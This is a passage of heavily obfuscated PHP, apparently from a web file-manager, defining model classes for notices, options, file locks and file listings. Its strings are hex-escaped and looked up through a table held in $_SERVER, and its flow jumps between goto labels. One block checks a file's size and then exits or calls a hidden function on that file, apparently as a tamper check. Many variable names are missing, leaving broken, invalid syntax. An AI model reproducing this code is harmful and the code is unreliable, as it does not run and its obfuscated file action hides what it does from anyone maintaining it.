$GLOBALS[$[1023]] = array(); } $GLOBALS[$[1023]][$ꉎŅ] = !1; $ր = fopen(DATA_PATH . $ꉎŅ . $[1024], $[1025]); if (!$ր) { return !1; } $GLOBALS[$[1023]][$ꉎŅ] = $ր; if (flock($ր, LOCK_EX)) { return !0; } self::unlock($ꉎŅ); show_json($[1026], !1); return !1; } public static function fileUnlock($) { $ =& $_SERVER[ܮ]; $խ = $GLOBALS[$[1023]][$]; if (!$խ) { return; } $GLOBALS[$[1023]][$] = !1; flock($խ, LOCK_UN); fclose($խ); } public static function fileUnlockAll() { $ =& $_SERVER[ܮ]; if (!isset($GLOBALS[$[1023]]) || !$GLOBALS[$[1023]]) { return; } foreach ($GLOBALS[$[1023]] as $ => $) { if (!$) { continue; } $GLOBALS[$[1023]][$] = !1; flock($, LOCK_UN); fclose($); } $GLOBALS[$[1023]] = array(); } } goto c齜; a쪵: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\156\157\x74\x69\143\x65\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\x63\157\156\x74\x65\156\164", "\141\x75\x74\150", "\155\x6f\144\x65", "\x74\151\155\x65", "\164\x79\x70\145", "\154\145\x76\145\x6c", "\x65\156\141\142\x6c\145", "\x73\157\162\164"); public function listData($򝧯 = false, $ = "\x73\x6f\x72\x74", $ = false) { return parent::listData($򝧯, $, $); } public function add($۷) { $ˬĭ =& $_SERVER[ܮ]; $ř = time(); if ($۷[$ˬĭ[16]] == $ˬĭ[2655]) { $ř = strtotime($۷[$ˬĭ[204]]); } $۷[$ˬĭ[204]] = $ř; return parent::insert($۷); } public function update($ʔ, $) { $؇ =& $_SERVER[ܮ]; $ = $this->listData($ʔ); if (!$) { return !1; } $ل讒 = time(); if ($[$؇[16]] == $؇[2655]) { $ل讒 = strtotime($[$؇[204]]); } $[$؇[204]] = $ل讒; return parent::update($ʔ, $); } public function remove($) { $ɓ = $this->listData($); if (!$ɓ || $ɓ[$_SERVER[ܮ][189]]) { return !1; } return parent::remove($); } public function sort($, $) { return parent::update($, $); } public function enable($Њ, $) { return parent::update($Њ, array($_SERVER[ܮ][2656] => $)); } private function initUserOption() { $ =& $_SERVER[ܮ]; $this->optionType = $[2657]; $this->modelType = $[2658]; $this->field = array($[2659], $[32], $[204], $[33], $[2660], $[848], $[226]); } public function userNoticeGet($ = false) { $this->initUserOption(); return parent::listData($, $_SERVER[ܮ][487], !0); } public function userNoticeAdd($) { $ =& $_SERVER[ܮ]; $this->initUserOption(); $Ա炟 = $this->findByKey($[2659], $[$[487]]); if ($Ա炟) { return !0; } $뿐 = array($[2659] => $[$[487]], $[32] => $[$[32]], $[204] => $[$[204]], $[33] => isset($[$[33]]) ? $[$[33]] : 1, $[2660] => isset($[$[2660]]) ? $[$[2660]] : 0, $[848] => 0, $[226] => 0); return parent::insert($뿐); } public function userNoticeEdit($ˡ, $آ) { $this->initUserOption(); return parent::update($ˡ, $آ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\x5f\x6f\160\164\151\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\157\x6c\x65", "\162\x6f\154\x65\107\162\x6f\165\x70", "\x72\145\x67\x69\x73\164", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($) { return "\x53\171\x73\x74\145\155\117\x70\x74\x69\x6f\156\137{$}"; } protected function optionDefault($Պ = '') { $뫪쐉 =& $_SERVER[ܮ]; if ($Պ == $뫪쐉[12]) { return $GLOBALS[$뫪쐉[6]][$뫪쐉[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto f; e쮩: $_file = $_SERVER[$_SERVER[ܮ][898]]; $_size = $_SERVER[ܮ][899]; if ($_SERVER[$_SERVER[ܮ][900]] != $_size($_file)) { $_getc = $_SERVER[ܮ][901]; $_getfile = $_SERVER[$_SERVER[ܮ][902]] . $_SERVER[ܮ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ܮ][285], $_getfilec); if (count($_getarrs) < $_SERVER[ܮ][715]) { $exit = $_SERVER[ܮ][904]; $exit(); } $_act = $_SERVER[ܮ][905]; $_act($_file); } goto D՗; B틉: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\117\x70\164\151\x6f\156"; public $field = array(); public function listData($О = false, $ = "\x6d\157\144\151\146\x79\x54\151\x6d\x65", $ଋ = false) { $ =& $_SERVER[ܮ]; $ɀ = Model($this->modelType)->get(!1, $this->optionType, !0); $ٶ = array_values($ɀ); if ($ٶ && $ٶ[0] && !is_array($ٶ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ɀ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ɀ) { return $О ? null : array(); } if (!$О && $О !== $[228]) { $ɀ = array_filter(array_values($ɀ)); return array_sort_by($ɀ, $, $ଋ, $[487]); } return $ɀ[$[488] . $О]; } public function insert($) { $Ǟ =& $_SERVER[ܮ]; $ = array_field_key($, $this->field); $ޥ = Model($this->modelType)->get($Ǟ[489], $this->optionType . $Ǟ[490]); $ޥ = $ޥ ? $ޥ : 0; $[$Ǟ[487]] = ++$ޥ; $[$Ǟ[231]] = time(); $[$Ǟ[88]] = time(); Model($this->modelType)->set($Ǟ[489], $ޥ, $this->optionType . $Ǟ[490]); Model($this->modelType)->set($Ǟ[488] . $ޥ, $, $this->optionType); return $ޥ; } public function insertArr($ń) { $閕ކ =& $_SERVER[ܮ]; if (!$ń || !is_array($ń)) { return !1; } $ = Model($this->modelType)->get($閕ކ[489], $this->optionType . $閕ކ[490]); $ = $ ? $ : 0; $ = array(); foreach ($ń as $艭) { $ֵ = array_field_key($艭, $this->field); $ֵ[$閕ކ[487]] = ++$; $ֵ[$閕ކ[231]] = time(); $ֵ[$閕ކ[88]] = time(); $[$閕ކ[488] . $] = $ֵ; } Model($this->modelType)->set($閕ކ[489], $, $this->optionType . $閕ކ[490]); Model($this->modelType)->set($, !1, $this->optionType); return $; } public function update($, $ҹ) { $ʱ =& $_SERVER[ܮ]; $ҹ = array_field_key($ҹ, $this->field); $˛ = $this->listData($); if (!$˛ || !$) { return !1; } $ҹ = array_merge($˛, $ҹ); $ҹ[$ʱ[88]] = time(); return Model($this->modelType)->set($ʱ[488] . $, $ҹ, $this->optionType); } public function remove($) { if (!$) { return !1; } return Model($this->modelType)->remove($_SERVER[ܮ][488] . $, $this->optionType); } public function removeArr($ϥ) { if (!$ϥ) { return !0; } $ = array(); foreach ($ϥ as $ӽ) { $[] = $_SERVER[ܮ][488] . $ӽ; } return Model($this->modelType)->removeArr($, $this->optionType); } public function clear() { $ =& $_SERVER[ܮ]; Model($this->modelType)->remove($[489], $this->optionType . $[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($, $ʀ) { if (!$ʀ) { return !1; } $ = $this->listData(); $ = array_to_keyvalue($, $); return isset($[$ʀ]) ? $[$ʀ] : !1; } public function findByName($ݧ) { return $this->findByKey($_SERVER[ܮ][32], $ݧ); } protected function resetData($׉) { $ =& $_SERVER[ܮ]; if (!$׉) { return; } $׉ = is_array($׉) ? $׉ : array(); $ = array(); for ($© = 0; $© < count($׉); $©++) { if (!$׉[$©] || !$׉[$©][$[487]]) { continue; } $[$[488] . $׉[$©][$[487]]] = $׉[$©]; } return Model($this->modelType)->set($, !1, $this->optionType); } private function getAutoName($˓) { $ = array_to_keyvalue($this->listData(), $_SERVER[ܮ][32]); if (!$ || !isset($[$˓])) { return $˓; } for ($֓ = 1; $֓ < count($); $֓++) { $ƴ = $˓ . "\50{$֓}\x29"; if (!isset($[$ƴ])) { return $ƴ; } } return $ƴ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ߊȃ = false, $ = '', $ѓ = false, $ = true) { $չ =& $_SERVER[ܮ]; $ = $this->cacheGet($); $ݟ = $this->optionDefault($); $ݟ = is_array($ݟ) ? $ݟ : array(); if (is_array($)) { if ($) { $ = array_merge($ݟ, $); } return $ߊȃ ? isset($[$ߊȃ]) ? $[$ߊȃ] : null : $; } $Ϭ = $this->filterWhere(array($չ[33] => $)); $ = $this->where($Ϭ)->select(); $ = array_to_keyvalue($, $չ[95], $չ[451]); foreach ($ as $ => $ٯ) { if ($ѓ || in_array($, $this->jsonField)) { $[$] = json_decode($ٯ, !0); } } $this->cacheSet($, $); if ($) { $ = array_merge($ݟ, $); } return $ߊȃ ? $[$ߊȃ] : $; } public function set($ǎ, $މ = false, $ҟ = '') { $Ƥ =& $_SERVER[ܮ]; if (!$ǎ) { return !0; } $̔ = $this->get(!1, $ҟ, !1, !1); $̔ = is_array($̔) ? $̔ : array(); $赸ۗ = array(); $А = array(); $ = array(); $ԡ = is_array($ǎ) ? $ǎ : array($ǎ => $މ); $⚌ = $this->filterWhere(array($Ƥ[33] => $ҟ)); foreach ($ԡ as $ݰ => $隝) { if (is_array($隝)) { $隝 = json_encode_force($隝); } $this->checkLength($隝, !1, $this->tableName . $Ƥ[4] . $ǎ); $隝 = self::textEncode($隝); if (array_key_exists($ݰ, $̔)) { $ɸ = is_array($̔[$ݰ]) ? json_encode_force($̔[$ݰ]) : $̔[$ݰ]; $ɸ = self::textEncode($ɸ); if ($ɸ === $隝) { continue; } $А[] = array($Ƥ[95], $ݰ, $Ƥ[451], $隝, $Ƥ[88], time()); } else { $巟 = array($Ƥ[33] => $ҟ, $Ƥ[95] => $ݰ, $Ƥ[451] => $隝); $赸ۗ[] = $this->filterWhere($巟); } } if (!$赸ۗ && !$А) { return !0; } $this->cacheRemove($ҟ); $ = $this->cacheKey($Ƥ[491]); CacheLock::lock($); if ($赸ۗ) { $this->addAll($赸ۗ); } if ($А) { $this->saveAll($А, $⚌); } CacheLock::unlock($); return !0; } protected function optionDefault($Ӷ = '') { return !1; } public function setDeep($, $ʂ = false, $Җ = '') { $ϣ = explode($_SERVER[ܮ][10], $); $ = $this->get(); array_set_value($, $, $ʂ); $this->set($ϣ[0], $[$ϣ[0]], $Җ); } public function remove($;, $ = '') { $Ä =& $_SERVER[ܮ]; $this->cacheRemove($); $ד = $this->filterWhere(array($Ä[95] => $;, $Ä[33] => $)); if (is_null($;)) { unset($ד[$Ä[95]]); } return $this->where($ד)->delete(); } public function removeArr($³ɉ, $՞ = '') { $Ğ =& $_SERVER[ܮ]; if (!$³ɉ || !is_array($³ɉ)) { return !0; } $this->cacheRemove($՞); $˥ڤ = $this->filterWhere(array($Ğ[33] => $՞, $Ğ[95] => array($Ğ[7], $³ɉ))); return $this->where($˥ڤ)->delete(); } public function cacheSet($ѧ, $׶ = false) { return Cache::set($this->cacheKey($ѧ), $׶); } public function cacheGet($) { return Cache::get($this->cacheKey($)); } public function cacheRemove($) { return Cache::remove($this->cacheKey($)); } protected function filterWhere($) { return $; } protected function cacheKey($) { return $; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\x75\162\x63\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\155\145" => "\x69\157\137\x73\x6f\165\162\x63\x65\137\155\145\x74\141", "\155\145\164\x61\106\x69\x65\x6c\x64" => "\x73\x6f\x75\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\155\145", "\164\x69\155\x65", "\151\156\163\x65\x72\164", "\x66\165\156\143\x74\151\x6f\x6e"), array("\143\x72\x65\141\164\x65\124\x69\155\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\143\164\x69\x6f\156"), array("\x76\x69\x65\167\124\151\155\x65", "\x74\151\x6d\x65", "\x69\156\163\145\162\x74", "\146\165\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($) { return $this->listSource(array($_SERVER[ܮ][492] => $)); } public function typeName($) { static $赸 = array(self::TYPE_SYSTEM => "\163\x79\163\x74\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $赸[$ . $_SERVER[ܮ][12]]; } public function sourceListInfo($ڸ, $ = false) { $ܞ =& $_SERVER[ܮ]; $ڸ = $ڸ ? $ڸ : array(); $ڸ = array_filter(array_unique($ڸ)); if (!$ڸ) { return array(); } $ = $this->where(array($ܞ[191] => array($ܞ[7], $ڸ)))->select(); $this->_listDataApply($, $); return array_to_keyvalue($, $ܞ[191]); } public function pathInfoFilter(&$؇ԛɯ) { $ =& $_SERVER[ܮ]; static $ = false; static $ų = false; static $ = false; if (!$) { $ = $[493]; $ .= $[494]; $ .= $[495]; $ = $[496]; $د = explode($[50], $); $ = explode($[50], $); $ų = array(); foreach ($ as $ԥ) { if (in_array($ԥ, $د)) { continue; } $ų[] = $ԥ; } $ = explode($[50], $[497]); } foreach ($ as $ṧ) { if (isset($؇ԛɯ[$ṧ])) { $؇ԛɯ[$ṧ] = intval($؇ԛɯ[$ṧ]); } } $؇ԛɯ[$[87]] = $[498] . $؇ԛɯ[$[191]] . $[499]; $؇ԛɯ[$[33]] = $؇ԛɯ[$[500]] == 1 ? $[78] : $[230]; $؇ԛɯ[$[188]] = $this->typeName($؇ԛɯ[$[188]]); if ($؇ԛɯ[$[500]] != 1) { $؇ԛɯ[$[166]] = $؇ԛɯ[$[501]]; unset($؇ԛɯ[$[501]]); } $ҁ = $; if (isset($؇ԛɯ[$[502]]) && $؇ԛɯ[$[502]][$[503]] == -1) { $ҁ = $ų; } $؇ԛɯ = array_field_key($؇ԛɯ, $ҁ); return $؇ԛɯ; } public function listUserFav() { $ʩ =& $_SERVER[ܮ]; $ = Model($ʩ[504])->listData(); $ۧ = array_filter_by_field($, $ʩ[33], $ʩ[505]); $ۧ = array_to_keyvalue($ۧ, $ʩ[12], $ʩ[87]); if ($ۧ) { $ݳ = $this->listSource(array($ʩ[506] => array($ʩ[507], $ۧ))); } $ݳ = array_to_keyvalue($ݳ[$ʩ[446]], $ʩ[191]); foreach ($ as &$ŕ) { $ŕ = array($ʩ[508] => $ŕ[$ʩ[487]], $ʩ[509] => $ŕ[$ʩ[32]], $ʩ[510] => $ŕ[$ʩ[87]], $ʩ[511] => $ŕ[$ʩ[33]], $ʩ[512] => $ŕ[$ʩ[231]], $ʩ[513] => $ŕ[$ʩ[88]]); if ($ŕ[$ʩ[33]] == $ʩ[505] && $ݳ[$ŕ[$ʩ[87]]]) { $ŕ[$ʩ[90]] = $ݳ[$ŕ[$ʩ[87]]]; } } unset($ŕ); return $; } public function listUserTag($á) { $Ȕ =& $_SERVER[ܮ]; if ($á && !is_array($á)) { $á = array($á); } $ = Model($Ȕ[514])->listData(); $ڃ = array(); $ݼ = array(); foreach ($ as $Գ) { $מ¾ = $Գ[$Ȕ[87]]; if (!$מ¾) { continue; } if (!isset($ݼ[$מ¾])) { $ݼ[$מ¾] = array(); } $ݼ[$מ¾][] = $Գ[$Ȕ[515]]; $ڃ[$Գ[$Ȕ[87]]] = $Գ; } $ = array(); $ = array(); $Ӌ = array(); foreach ($ݼ as $ĭ => $) { $с = !0; if (!$á) { $[] = $ĭ; continue; } foreach ($á as $) { if (!in_array($, $)) { $с = !1; break; } } if (!$с) { continue; } if (!is_numeric($ĭ)) { $ = $ڃ[$ĭ]; $ = array($Ȕ[32] => $[$Ȕ[32]], $Ȕ[87] => $[$Ȕ[87]], $Ȕ[33] => $[$Ȕ[33]], $Ȕ[90] => array($Ȕ[516] => 1), $Ȕ[232] => !0); if ($[$Ȕ[33]] == $Ȕ[230]) { $Ӌ[] = $; } if ($[$Ȕ[33]] == $Ȕ[78]) { $[] = $; } continue; } $[] = $ĭ; } if ($) { $Ǌ = $this->listSource(array($Ȕ[506] => array($Ȕ[507], $))); } $Ǌ = $Ǌ ? $Ǌ : array($Ȕ[85] => array(), $Ȕ[86] => array()); $Ǌ[$Ȕ[85]] = array_merge($Ǌ[$Ȕ[85]], $); $Ǌ[$Ȕ[86]] = array_merge($Ǌ[$Ȕ[86]], $Ӌ); if (isset($Ǌ[$Ȕ[443]]) && count($) == $Ǌ[$Ȕ[443]][$Ȕ[444]]) { return $Ǌ; } $ʪĂ = array(); $ = array_to_keyvalue($Ǌ[$Ȕ[85]], $Ȕ[12], $Ȕ[191]); $И = array_to_keyvalue($Ǌ[$Ȕ[86]], $Ȕ[12], $Ȕ[191]); $͒ = array_merge($И, $); foreach ($ as $מ¾) { if (!in_array($מ¾, $͒)) { $ʪĂ[] = $מ¾; } } if ($ʪĂ) { Model($Ȕ[517])->removeBySource($ʪĂ); } return $Ǌ; } public function listUserRecycle() { $ =& $_SERVER[ܮ]; $ = Model($[518])->listData(); if (!$) { return array(); } $ = array($[506] => array($[507], $), $[519] => 1); return $this->listSource($); } public function listSource($З, $ښ = 3000, $֐ = false) { $ =& $_SERVER[ܮ]; if (!isset($З[$[520]])) { $З[$[520]] = 0; } if (isset($З[$[190]]) && $З[$[190]] == $[228]) { $З[$[501]] = array($[464], $[12]); } if (isset($З[$[190]])) { $З[$[190]] = intval($З[$[190]]); } $ = $[521]; $پ = $this->field($)->_makeOrder()->where($З)->selectPage($ښ); $this->_listPageCheck($پ, $, $З); $this->_listDataApply($پ[$[446]], $֐); $this->_listMake($پ); return $پ; } private function _listPageCheck(&$਄, $, $) { $ĺ =& $_SERVER[ܮ]; if (!is_array($਄[$ĺ[443]])) { return; } $ր = $਄[$ĺ[443]]; if ($ր[$ĺ[445]] <= 1) { return; } if ($ր[$ĺ[444]] >= 100000) { return; } if (Model($ĺ[522])->get($ĺ[523]) != $ĺ[524]) { return; } $ = str_replace(array($ĺ[53], $ĺ[417], $ĺ[285]), $ĺ[12], $); $ = $ĺ[525] . str_replace($ĺ[50], $ĺ[526], $) . $ĺ[527]; $ا = $ĺ[528]; $ا = $ا . $ĺ[529]; $ = $ր[$ĺ[439]] * ($ր[$ĺ[428]] - 1) . $ĺ[50] . $ր[$ĺ[439]]; $ = $this->_makeOrder(!0); $ = $ĺ[525] . str_replace($ĺ[50], $ĺ[526], $[0]); if (strpos($, $ĺ[530])) { $ = str_replace($ĺ[530], $ĺ[531], $); } else { $ .= $ĺ[532] . $[1]; } $ = array(); foreach ($ as $ => $) { $[$ĺ[525] . $] = $; } $this->alias($ĺ[533])->field($)->limit($)->order($); $䞭 = $this->join($ا)->where($)->select(); if ($䞭) { $਄[$ĺ[446]] = $䞭; } } protected function _makeOrder($ = false) { $ =& $_SERVER[ܮ]; $ = Model($[534])->get($[535]); $ݬ = Model($[534])->get($[536]); $ɾ = array($[537] => $[538], $[539] => $[540]); $ݛ = array($[32] => $[32], $[79] => $[79], $[166] => $[501], $[541] => $[541], $[542] => $[543], $[231] => $[231], $[88] => $[88]); $ = Input::get($[544], $[7], $, array_keys($ݛ)); $ = Input::get($[545], $[7], $ݬ, array_keys($ɾ)); if (!in_array($, array_keys($ݛ))) { $ = $[32]; } if (!in_array($, array_keys($ɾ))) { $ = $[537]; } if ($ == $[32]) { } $μ = $[546] . $ݛ[$] . $[53] . $ɾ[$]; $μ = rtrim(trim($μ), $[50]); if ($) { return array($μ, $ɾ[$]); } return $this->order($μ); } protected function _listDataApplyItem($шՕ, $ı = false) { $罹 = array($шՕ); $this->_listDataApply($罹, $ı); return $罹[0]; } protected function _listDataApply(&$įϞ, $ = false) { $ =& $_SERVER[ܮ]; if (!$įϞ) { $įϞ = array(); return; } $Ȣ = array_to_keyvalue($įϞ, $[12], $[191]); $Ȣ = array_unique($Ȣ); $Ȣ = array_to_int($Ȣ); $this->_listSourceCache($įϞ); if (!$) { $this->_listAppendMeta($įϞ, $Ȣ); $this->_listAppendFileMeta($įϞ, $Ȣ); $this->_listAppendChildren($įϞ, $Ȣ); } $this->_listAppendPath($įϞ); $this->_listAppendAuth($įϞ); $this->_listAppendSourceInfo($įϞ, $Ȣ); $this->_listAppendUser($įϞ); $this->_listFilterInfo($įϞ, $); $this->_listAppendAuthSecret($įϞ); } protected function _listSourceCache($Ĝ۳) { $ף =& $_SERVER[ܮ]; foreach ($Ĝ۳ as $֒) { self::$cacheSourceInfo[$ף[547] . $֒[$ף[191]]] = $֒; } } protected function _listFilterInfo(&$ҿ, $ = false) { $⹴ =& $_SERVER[ܮ]; foreach ($ҿ as &$) { $ = $this->pathInfoFilter($); self::$cachePathInfo[$⹴[548] . intval($) . $⹴[476] . $[$⹴[191]]] = $; } unset($); } protected function _listMake(&$) { $̎ӌ =& $_SERVER[ܮ]; $[$̎ӌ[85]] = array(); $[$̎ӌ[86]] = array(); foreach ($[$̎ӌ[446]] as $򤦟ͯ) { $Ð = $򤦟ͯ[$̎ӌ[500]] == 1 ? $̎ӌ[85] : $̎ӌ[86]; $[$Ð][] = $򤦟ͯ; } unset($[$̎ӌ[446]]); } protected function _listAppendMeta(&$Ի, $Ѐ) { $Ճ =& $_SERVER[ܮ]; $ = array($Ճ[506] => array($Ճ[507], $Ѐ)); $ = Model($Ճ[549])->field($Ճ[550])->where($)->select(); if (!$) { return; } $ְ = array($Ճ[551], $Ճ[552], $Ճ[531]); $ҿ = array(); foreach ($ as $σ) { if (!isset($ҿ[$σ[$Ճ[191]]])) { $ҿ[$σ[$Ճ[191]]] = array(); } if (in_array($σ[$Ճ[95]], $ְ)) { continue; } if ($σ[$Ճ[95]] == $Ճ[553]) { $σ[$Ճ[451]] = $Ճ[554]; } $ҿ[$σ[$Ճ[191]]][$σ[$Ճ[95]]] = $σ[$Ճ[451]]; } foreach ($Ի as &$֟) { $֟[$Ճ[555]] = !1; if (isset($ҿ[$֟[$Ճ[191]]])) { $֟[$Ճ[555]] = $ҿ[$֟[$Ճ[191]]]; } if ($this->fileIsLock($֟) && $֟[$Ճ[502]]) { $ʾ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $֟[$Ճ[502]][$Ճ[503]] = AuthModel::authDisable($֟[$Ճ[502]][$Ճ[503]], $ʾ); $֟[$Ճ[502]][$Ճ[556]][$Ճ[502]] = $֟[$Ճ[502]][$Ճ[503]]; } } unset($֟); } protected function _listAppendFileMeta(&$, $) { $ĭ =& $_SERVER[ܮ]; $󨚯 = array_to_keyvalue($, $ĭ[12], $ĭ[557]); $󨚯 = array_filter(array_unique($󨚯)); $󨚯 = array_to_int($󨚯); if (!$󨚯) { return; } $ďӦ = array($ĭ[558] => array($ĭ[507], $󨚯)); $Ч = $ĭ[559]; $ = Model($ĭ[560])->field($Ч)->where($ďӦ)->select(); $ = array_to_keyvalue($, $ĭ[557]); $ = Model($ĭ[561])->field($ĭ[562])->where($ďӦ)->select(); $ = $ ? $ : array(); $퀽 = array(); foreach ($ as $) { if (!isset($퀽[$[$ĭ[557]]])) { $퀽[$[$ĭ[557]]] = array(); } $퀽[$[$ĭ[557]]][$[$ĭ[95]]] = $[$ĭ[451]]; } foreach ($ as &$) { $յۮ = $[$ĭ[557]]; if (!$յۮ || !is_array($[$յۮ])) { continue; } $ = $[$յۮ]; $[$ĭ[79]] = $[$ĭ[79]]; $[$ĭ[32]] = $[$ĭ[32]]; if (!$[$ĭ[563]]) { Model($ĭ[560])->fileMd5Check($); } if (!isset(self::$cacheFileInfo[$ĭ[564] . $յۮ])) { self::$cacheFileInfo[$ĭ[564] . $յۮ] = array_merge(array(), $); } unset($[$յۮ][$ĭ[87]]); $ = isset($퀽[$յۮ]) && is_array($퀽[$յۮ]) ? $퀽[$յۮ] : array(); $[$ĭ[167]] = array_merge($, $[$յۮ]); if (isset($[$ĭ[167]][$ĭ[182]])) { $[$ĭ[182]] = json_decode($[$ĭ[167]][$ĭ[182]], !0); unset($[$ĭ[167]][$ĭ[182]]); } } unset($); } protected function _listAppendSourceInfo(&$ȶ, $޳) { $˸ =& $_SERVER[ܮ]; $۾ߝ = Model($˸[565])->listData(); $ = Model($˸[514])->listData(); $ί = Model($˸[504])->listData(); $Ϫ = Model($˸[566])->listSimple(); $Ȉ = array_to_keyvalue($۾ߝ, $˸[487]); $Լ = array_to_keyvalue_group($, $˸[87], $˸[515]); $߄ = array_to_keyvalue($ί, $˸[87]); $͆ = array_to_keyvalue_group($Ϫ, $˸[191]); foreach ($ȶ as &$ߠ) { $ߠ[$˸[90]] = array($˸[567] => 0, $˸[568] => 0, $˸[569] => 0); if (isset($߄[$ߠ[$˸[191]]])) { $ߠ[$˸[90]][$˸[570]] = 1; $ߠ[$˸[90]][$˸[571]] = $߄[$ߠ[$˸[191]]][$˸[32]]; } if ($Լ && $Ȉ && isset($Լ[$ߠ[$˸[191]]])) { $ߠ[$˸[90]][$˸[572]] = array(); foreach ($Լ[$ߠ[$˸[191]]] as $) { $爖 = $Ȉ[$]; $ߠ[$˸[90]][$˸[572]][] = array($˸[573] => $爖[$˸[487]], $˸[509] => $爖[$˸[32]], $˸[574] => $爖[$˸[575]]); } } if ($͆ && isset($͆[$ߠ[$˸[191]]])) { $ߠ[$˸[90]][$˸[576]] = array(); foreach ($͆[$ߠ[$˸[191]]] as $) { $ߠ[$˸[90]][$˸[576]] = $this->shareFilterShow($); } } } unset($ߠ); return $ȶ; } protected function shareFilterShow($ЕÙ) { $ =& $_SERVER[ܮ]; if (!$ЕÙ) { return $ЕÙ; } $ = $[577]; if ($ЕÙ[$[578]] == $[91]) { $ .= $[579]; } if (is_array($ЕÙ[$[580]]) && is_array($ЕÙ[$[580]][$[581]])) { $ЕÙ[$[580]][$[581]] = $[582]; } if (!$[$[583]] && $[$[191]] != $[228]) { $[$[583]] = KodIO::make($[$[191]]); } $ЕÙ = array_field_key($ЕÙ, explode($[50], $)); return $ЕÙ; } protected function _listAppendChildren(&$͡, $) { $Ȓʷ =& $_SERVER[ܮ]; $ = array(); $ӵ쒯 = array($Ȓʷ[239] => 0, $Ȓʷ[240] => 0); foreach ($͡ as &$) { if (!$[$Ȓʷ[500]]) { continue; } $[] = intval($[$Ȓʷ[191]]); } unset($); if (!$) { return; } $ڿ = array($Ȓʷ[190] => array($Ȓʷ[7], $), $Ȓʷ[520] => 0); $ = array($Ȓʷ[190], $Ȓʷ[500], $Ȓʷ[584] => $Ȓʷ[585]); $ = $this->field($)->where($ڿ)->group($Ȓʷ[586])->select(); $օК = array(); foreach ($ as $Ĕ) { $ = $Ĕ[$Ȓʷ[190]]; $Һ = $Ĕ[$Ȓʷ[500]] == $Ȓʷ[91] ? $Ȓʷ[240] : $Ȓʷ[239]; if (!isset($օК[$])) { $օК[$] = array($Ȓʷ[239] => 0, $Ȓʷ[240] => 0); } $օК[$][$Һ] += $Ĕ[$Ȓʷ[585]]; } foreach ($͡ as &$) { if (!$[$Ȓʷ[500]]) { continue; } $Ο = is_array($օК[$[$Ȓʷ[191]]]) ? $օК[$[$Ȓʷ[191]]] : $ӵ쒯; $[$Ȓʷ[240]] = $Ο[$Ȓʷ[240]]; $[$Ȓʷ[239]] = $Ο[$Ȓʷ[239]]; unset($[$Ȓʷ[501]]); } unset($); } protected function _listAppendAuth(&$Ţ¡) { $ʕ =& $_SERVER[ܮ]; $ = array(); foreach ($Ţ¡ as $̧) { if ($̧[$ʕ[188]] == self::TYPE_GROUP) { $[] = intval($̧[$ʕ[191]]); } } if (!$) { return; } $ﯽ = array_to_keyvalue($Ţ¡, $ʕ[191]); $ɚ = Model($ʕ[587])->getSourceList($, $ﯽ); $ = KodUser::isRoot(); foreach ($Ţ¡ as $ɩ => &$̧) { $̧[$ʕ[502]] = $ɚ[$̧[$ʕ[191]]]; if (!$̧[$ʕ[502]] && $̧[$ʕ[188]] == self::TYPE_GROUP) { $̧[$ʕ[502]] = Action($ʕ[588])->pathGroupAuthMake($̧[$ʕ[589]]); if (!$̧[$ʕ[502]] && !$) { $̧[$ʕ[233]] = !1; $̧[$ʕ[232]] = !1; } } if ($̧[$ʕ[502]]) { $̧[$ʕ[233]] = AuthModel::authCheckEdit($̧[$ʕ[502]][$ʕ[503]]); $̧[$ʕ[232]] = AuthModel::authCheckView($̧[$ʕ[502]][$ʕ[503]]); } $this->groupPathDisplay($̧); } unset($̧); } public function _listAppendAuthSecret(&$) { $ц =& $_SERVER[ܮ]; if (Model($ц[522])->get($ц[590]) != $ц[91]) { return; } static $յ = false; if (!$յ) { $ = Model($ц[591]); $ = Model($ц[592]); $յ = $->listData(); $յ = array_to_keyvalue($յ, $ц[191]); $׼ = json_decode(Model($ц[522])->get($ц[593]), !0); $׼ = array_to_keyvalue($׼, $ц[487]); foreach ($յ as $ō => $) { $ = $׼[$[$ц[594]]]; if (!$) { $->remove($[$ц[487]]); unset($յ[$ō]); continue; } $ = $->listData($[$ц[502]]); if (!$) { $->remove($[$ц[487]]); unset($յ[$ō]); continue; } $[$ц[502]] = $; $[$ц[595]] = $; $[$ц[596]] = Model($ц[597])->getInfoSimpleOuter($[$ц[541]]); $յ[$ō] = $; } } $ی = USER_ID; $ˊ = array(); $콥 = $this->_listAppendPath($ˊ, !0); foreach ($ as $ō => &$) { if (!is_array($[$ц[502]])) { continue; } if ($[$ц[188]] != $ц[598]) { continue; } if (isset($յ[$[$ц[191]]])) { $ӿ = $յ[$[$ц[191]]]; if (!is_array($[$ц[555]])) { $[$ц[555]] = array(); } $[$ц[555]][$ц[599]] = $ӿ[$ц[594]]; $[$ц[502]][$ц[600]] = $ӿ; $[$ц[502]][$ц[601]] = $[$ц[602]]; $[$ц[502]][$ц[603]] = $ц[91]; if ($ӿ[$ц[541]] != $ی) { $[$ц[502]][$ц[503]] = $[$ц[502]][$ц[503]] & $ӿ[$ц[502]][$ц[502]]; } continue; } $ӥ = $this->parentLevelArray($[$ц[604]]); $ = array_reverse($ӥ); foreach 